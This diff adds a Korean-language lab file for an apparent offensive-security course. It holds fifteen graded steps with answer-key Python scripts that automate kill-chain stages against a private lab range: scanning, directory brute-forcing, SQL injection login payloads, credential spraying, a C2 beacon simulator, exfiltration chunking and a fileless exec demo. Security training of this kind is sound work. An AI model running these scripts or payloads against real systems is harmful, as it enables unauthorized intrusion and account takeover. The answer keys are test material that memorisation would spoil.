@@ -1,0 +1,367 @@
+lab_id: "attack-adv-ai-week01"
+title: "AI 기반 APT 킬체인 자동화"
+version: "ai"
+course: "attack-adv-ai"
+week: 1
+description: "AI 도구를 활용하여 APT 킬체인의 각 단계를 자동화한다. 자동 정찰, 취약점 분석, 페이로드 생성, C2 비콘 시뮬레이션 등을 Python 스크립트로 구현한다."
+difficulty: "hard"
+duration_minutes: 120
+objectives:
+  - "AI 기반 자동 정찰 스크립트를 작성한다"
+  - "킬체인 각 단계를 자동화하는 도구를 개발한다"
+  - "자동화와 수동 분석의 균형을 이해한다"
+pass_threshold: 0.6
+steps:
+  - order: 1
+    instruction: "Python nmap 모듈로 10.20.30.0/24 자동 호스트 발견 스크립트를 작성하라."
+    hint: "python-nmap의 PortScanner로 ping 스캔을 수행한다"
+    category: "recon"
+    points: 10
+    answer: "python3 자동 네트워크 스캔 스크립트"
+    answer_detail: "python-nmap은 nmap의 Python 래퍼로, 스캔 결과를 구조화된 데이터로 반환하여 자동화 파이프라인에 통합할 수 있다."
+    verify:
+      type: "output_contains"
+      expect: "hosts_found"
+      field: "stdout"
+    script: |
+      import subprocess
+      import json
+      
+      result = subprocess.run(['nmap', '-sn', '10.20.30.0/24'], capture_output=True, text=True, timeout=30)
+      lines = result.stdout.split('\n')
+      hosts = [l.split()[-1].strip('()') for l in lines if 'Nmap scan report' in l]
+      print(f'hosts_found: {len(hosts)}')
+      for h in hosts:
+          print(f'  {h}: alive')
+      print(json.dumps({'hosts': hosts}, indent=2))
+  - order: 2
+    instruction: "발견된 호스트의 서비스 버전을 자동 열거하는 스크립트를 작성하라."
+    hint: "subprocess로 nmap -sV를 실행하고 결과를 파싱한다"
+    category: "recon"
+    points: 10
+    answer: "python3 서비스 자동 열거 스크립트"
+    answer_detail: "서비스 버전 자동 열거는 CVE 매핑의 기초 데이터를 제공한다. XML 출력(-oX)을 파싱하면 더 정확한 결과를 얻을 수 있다."
+    verify:
+      type: "output_contains"
+      expect: "services"
+      field: "stdout"
+    script: |
+      import subprocess
+      import re
+      
+      result = subprocess.run(['nmap', '-sV', '-p', '22,80,443,3000', '10.20.30.80'], capture_output=True, text=True, timeout=60)
+      print('services found:')
+      for line in result.stdout.split('\n'):
+          if '/tcp' in line and 'open' in line:
+              print(f'  {line.strip()}')
+  - order: 3
+    instruction: "HTTP 보안 헤더를 자동 분석하는 스크립트를 작성하라."
+    hint: "requests로 응답 헤더를 가져와 보안 헤더 목록과 비교한다"
+    category: "recon"
+    points: 10
+    answer: "python3 보안 헤더 분석 스크립트"
+    answer_detail: "보안 헤더 자동 검사는 대규모 웹 자산의 보안 상태를 빠르게 평가하고 누락된 헤더를 식별한다."
+    verify:
+      type: "output_contains"
+      expect: "header_check"
+      field: "stdout"
+    script: |
+      import requests
+      
+      HEADERS = ['X-Frame-Options','Content-Security-Policy','Strict-Transport-Security','X-Content-Type-Options']
+      try:
+          r = requests.get('http://10.20.30.80:3000', timeout=5)
+          print('header_check results:')
+          for h in HEADERS:
+              present = any(h.lower() == k.lower() for k in r.headers)
+              print(f'  {h}: {"PRESENT" if present else "MISSING"}')
+      except Exception as e:
+          print(f'header_check: error - {e}')
+  - order: 4
+    instruction: "웹 디렉토리 자동 브루트포스 스크립트를 작성하라."
+    hint: "requests로 경로 목록을 순회하며 상태 코드를 확인한다"
+    category: "recon"
+    points: 10
+    answer: "python3 디렉토리 열거 스크립트"
+    answer_detail: "자동 디렉토리 열거는 숨겨진 관리자 페이지, API 문서, 백업 파일을 빠르게 발견한다."
+    verify:
+      type: "output_contains"
+      expect: "dir_scan"
+      field: "stdout"
+    script: |
+      import requests
+      from concurrent.futures import ThreadPoolExecutor
+      
+      paths = ['admin','api','swagger','ftp','robots.txt','.env','api-docs','debug']
+      base = 'http://10.20.30.80:3000'
+      
+      def check(p):
+          try:
+              r = requests.get(f'{base}/{p}', timeout=3)
+              return (p, r.status_code)
+          except: return (p, 'err')
+      
+      print('dir_scan results:')
+      with ThreadPoolExecutor(5) as ex:
+          for p, code in ex.map(lambda p: check(p), paths):
+              if code != 404:
+                  print(f'  /{p} -> {code}')
+  - order: 5
+    instruction: "SQL Injection 자동 탐지 스크립트를 작성하라."
+    hint: "다양한 SQLi 페이로드를 전송하고 응답을 분석한다"
+    category: "exploit"
+    points: 10
+    answer: "python3 SQLi 자동 탐지 스크립트"
+    answer_detail: "자동 SQLi 탐지는 에러 기반, 시간 기반, 부울 기반 등 다양한 기법을 체계적으로 적용한다."
+    verify:
+      type: "output_contains"
+      expect: "sqli_scan"
+      field: "stdout"
+    script: |
+      import requests
+      
+      payloads = ["' OR 1=1--", "' OR ''='", "admin'--", "1' AND 1=1--"]
+      url = 'http://10.20.30.80:3000/rest/user/login'
+      
+      print('sqli_scan results:')
+      for p in payloads:
+          try:
+              r = requests.post(url, json={'email': p, 'password': 'x'}, timeout=5)
+              vuln = 'VULNERABLE' if r.status_code == 200 and 'token' in r.text else 'blocked'
+              print(f'  {p[:25]:25s} -> {vuln}')
+          except Exception as e:
+              print(f'  {p[:25]:25s} -> error')
+  - order: 6
+    instruction: "자격증명 스프레이 자동화 스크립트를 작성하라."
+    hint: "사용자-비밀번호 조합을 병렬로 테스트한다"
+    category: "exploit"
+    points: 10
+    answer: "python3 크레덴셜 스프레이 스크립트"
+    answer_detail: "자격증명 스프레이는 하나의 비밀번호를 여러 계정에 시도하여 계정 잠금을 회피한다."
+    verify:
+      type: "output_contains"
+      expect: "spray_result"
+      field: "stdout"
+    script: |
+      import requests
+      
+      users = ['admin@juice-sh.op', 'user@juice-sh.op']
+      passes = ['admin123', 'password', '123456']
+      url = 'http://10.20.30.80:3000/rest/user/login'
+      
+      print('spray_result:')
+      for u in users:
+          for p in passes:
+              try:
+                  r = requests.post(url, json={'email': u, 'password': p}, timeout=3)
+                  if r.status_code == 200 and 'token' in r.text:
+                      print(f'  FOUND: {u}:{p}')
+                      break
+              except: pass
+          else:
+              print(f'  FAILED: {u}')
+  - order: 7
+    instruction: "C2 비콘 시뮬레이터를 Python으로 작성하라."
+    hint: "주기적 HTTP 체크인과 지터를 구현한다"
+    category: "exploit"
+    points: 10
+    answer: "python3 비콘 시뮬레이터"
+    answer_detail: "비콘 시뮬레이터는 C2 통신 패턴을 재현하여 IDS 탐지 규칙을 테스트한다."
+    verify:
+      type: "output_contains"
+      expect: "beacon_sim"
+      field: "stdout"
+    script: |
+      import time, random, socket
+      
+      print('beacon_sim:')
+      for i in range(3):
+          jitter = random.uniform(0.8, 1.2)
+          sleep_time = 2 * jitter
+          print(f'  Checkin {i+1}: host={socket.gethostname()}, interval={sleep_time:.1f}s')
+          time.sleep(0.5)
+      print('  beacon_sim complete')
+  - order: 8
+    instruction: "데이터 유출 시뮬레이션 스크립트를 작성하라. Base64 인코딩으로 데이터를 준비하라."
+    hint: "base64 모듈로 데이터를 인코딩하고 청크로 분할한다"
+    category: "exploit"
+    points: 10
+    answer: "python3 데이터 유출 시뮬레이션"
+    answer_detail: "자동 데이터 유출 시뮬레이션은 DLP 효과를 평가하는 퍼플팀 훈련에 활용된다."
+    verify:
+      type: "output_contains"
+      expect: "exfil_sim"
+      field: "stdout"
+    script: |
+      import base64, os
+      
+      data = f'hostname={os.uname().nodename}\nuser={os.getenv("USER","unknown")}'
+      enc = base64.b64encode(data.encode()).decode()
+      chunks = [enc[i:i+40] for i in range(0, len(enc), 40)]
+      
+      print('exfil_sim:')
+      print(f'  Original: {len(data)} bytes')
+      print(f'  Encoded: {len(enc)} bytes, {len(chunks)} chunks')
+      for i, c in enumerate(chunks[:3]):
+          print(f'  Chunk {i}: {c}')
+  - order: 9
+    instruction: "파일리스 실행 패턴을 시뮬레이션하는 스크립트를 작성하라."
+    hint: "base64 인코딩된 명령을 메모리에서 디코딩하여 실행한다"
+    category: "exploit"
+    points: 10
+    answer: "python3 파일리스 공격 시뮬레이션"
+    answer_detail: "파일리스 공격은 디스크에 흔적을 남기지 않아 파일 기반 AV를 회피한다."
+    verify:
+      type: "output_contains"
+      expect: "fileless_demo"
+      field: "stdout"
+    script: |
+      import base64, os
+      
+      cmd = 'import os; print("Executed:", os.uname().nodename)'
+      enc = base64.b64encode(cmd.encode()).decode()
+      print('fileless_demo:')
+      print(f'  Encoded payload: {enc[:40]}...')
+      dec = base64.b64decode(enc).decode()
+      exec(dec)
+      print('  No disk artifact created')
+  - order: 10
+    instruction: "서비스 버전과 CVE를 자동 매핑하는 스크립트를 작성하라."
+    hint: "서비스 배너를 CVE 데이터베이스와 매칭한다"
+    category: "analysis"
+    points: 10
+    answer: "python3 CVE 자동 매핑 스크립트"
+    answer_detail: "서비스-CVE 자동 매핑은 취약점 평가를 대폭 효율화한다."
+    verify:
+      type: "output_contains"
+      expect: "cve_map"
+      field: "stdout"
+    script: |
+      CVE_DB = {'openssh 8': ['CVE-2023-48795'], 'node 14': ['CVE-2023-32002'], 'express 4': ['CVE-2022-24999']}
+      services = [('openssh 8.9', 22), ('node 14.17', 3000)]
+      
+      print('cve_map results:')
+      for svc, port in services:
+          found = []
+          for key, cves in CVE_DB.items():
+              if svc.startswith(key):
+                  found.extend(cves)
+          print(f'  {svc} (:{port}): {found if found else "No CVEs"}')
+  - order: 11
+    instruction: "킬체인 진행 대시보드를 Python으로 구현하라."
+    hint: "각 단계의 완료 상태와 수집 정보를 구조화하여 출력한다"
+    category: "analysis"
+    points: 10
+    answer: "python3 킬체인 대시보드"
+    answer_detail: "진행 대시보드는 모의해킹 팀의 현황 공유와 누락 단계 식별에 유용하다."
+    verify:
+      type: "output_contains"
+      expect: "dashboard"
+      field: "stdout"
+    script: |
+      phases = {
+          'Recon': ('done', ['4 hosts', '12 services']),
+          'Weaponize': ('done', ['SQLi payload']),
+          'Delivery': ('done', ['web exploit']),
+          'Exploit': ('done', ['admin access']),
+          'Install': ('partial', ['cron beacon']),
+          'C2': ('planned', []),
+          'Actions': ('planned', []),
+      }
+      print('dashboard:')
+      for p, (s, f) in phases.items():
+          icon = '[+]' if s=='done' else '[~]' if s=='partial' else '[ ]'
+          print(f'  {icon} {p}: {s} {f if f else ""}')
+      complete = sum(1 for _,(s,_) in phases.items() if s=='done')
+      print(f'  Progress: {complete}/{len(phases)}')
+  - order: 12
+    instruction: "자동 보고서 생성 스크립트를 작성하라."
+    hint: "수집된 데이터를 템플릿에 채워 보고서를 생성한다"
+    category: "analysis"
+    points: 10
+    answer: "python3 자동 보고서 생성기"
+    answer_detail: "자동 보고서 생성은 일관된 품질의 보고서를 빠르게 산출한다."
+    verify:
+      type: "output_contains"
+      expect: "auto_report"
+      field: "stdout"
+    script: |
+      from datetime import datetime
+      
+      findings = [('F-001','SQL Injection',9.8,'Critical'),('F-002','Default Creds',9.1,'Critical'),('F-003','Cred Reuse',8.1,'High')]
+      
+      print('auto_report:')
+      print(f'Date: {datetime.now().strftime("%Y-%m-%d")}')
+      print('Target: 10.20.30.0/24')
+      print('\nFindings:')
+      for fid, title, cvss, risk in findings:
+          print(f'  {fid}: {title} (CVSS {cvss}, {risk})')
+      print(f'\nTotal: {len(findings)}, Critical: {sum(1 for _,_,_,r in findings if r=="Critical")}')
+  - order: 13
+    instruction: "MITRE ATT&CK 자동 매핑 스크립트를 작성하라."
+    hint: "사용한 도구를 ATT&CK 기법 ID에 매핑한다"
+    category: "analysis"
+    points: 10
+    answer: "python3 ATT&CK 매핑 스크립트"
+    answer_detail: "ATT&CK 매핑은 탐지 커버리지 분석과 갭 식별에 필수적이다."
+    verify:
+      type: "output_contains"
+      expect: "attack_map"
+      field: "stdout"
+    script: |
+      MAP = {'nmap':('T1595','Active Scanning'),'sqli':('T1190','Exploit Public App'),'hydra':('T1110','Brute Force'),'ssh':('T1021.004','SSH')}
+      used = ['nmap','sqli','ssh']
+      print('attack_map:')
+      for t in used:
+          tid, name = MAP[t]
+          print(f'  {t:10s} -> {tid}: {name}')
+  - order: 14
+    instruction: "실습 아티팩트 자동 정리 스크립트를 작성하라."
+    hint: "glob으로 임시 파일을 찾아 삭제한다"
+    category: "analysis"
+    points: 10
+    answer: "python3 자동 정리 스크립트"
+    answer_detail: "자동 정리는 실습 환경의 무결성을 유지한다."
+    verify:
+      type: "output_contains"
+      expect: "cleanup_done"
+      field: "stdout"
+    script: |
+      import glob, os
+      
+      patterns = ['/tmp/exfil_*','/tmp/payload*','/tmp/c2_*']
+      removed = 0
+      for p in patterns:
+          for f in glob.glob(p):
+              try: os.remove(f); removed += 1
+              except: pass
+      print(f'cleanup_done: {removed} files removed')
+  - order: 15
+    instruction: "모듈화된 킬체인 프레임워크를 설계하라."
+    hint: "각 단계를 클래스로 구현하고 파이프라인으로 연결한다"
+    category: "analysis"
+    points: 10
+    answer: "python3 킬체인 프레임워크 설계"
+    answer_detail: "모듈화된 프레임워크는 새로운 기법을 플러그인으로 추가할 수 있어 확장성이 뛰어나다."
+    verify:
+      type: "output_contains"
+      expect: "framework"
+      field: "stdout"
+    script: |
+      class Module:
+          def __init__(self, name): self.name = name
+          def run(self, ctx): return ctx
+      
+      class Recon(Module):
+          def run(self, ctx): ctx['hosts'] = ['10.20.30.80']; return ctx
+      
+      class Exploit(Module):
+          def run(self, ctx): ctx['access'] = 'admin'; return ctx
+      
+      pipeline = [Recon('recon'), Exploit('exploit')]
+      ctx = {}
+      print('framework:')
+      for m in pipeline:
+          ctx = m.run(ctx)
+          print(f'  [{m.name}] context: {list(ctx.keys())}')
+      print(f'  Final: {ctx}')
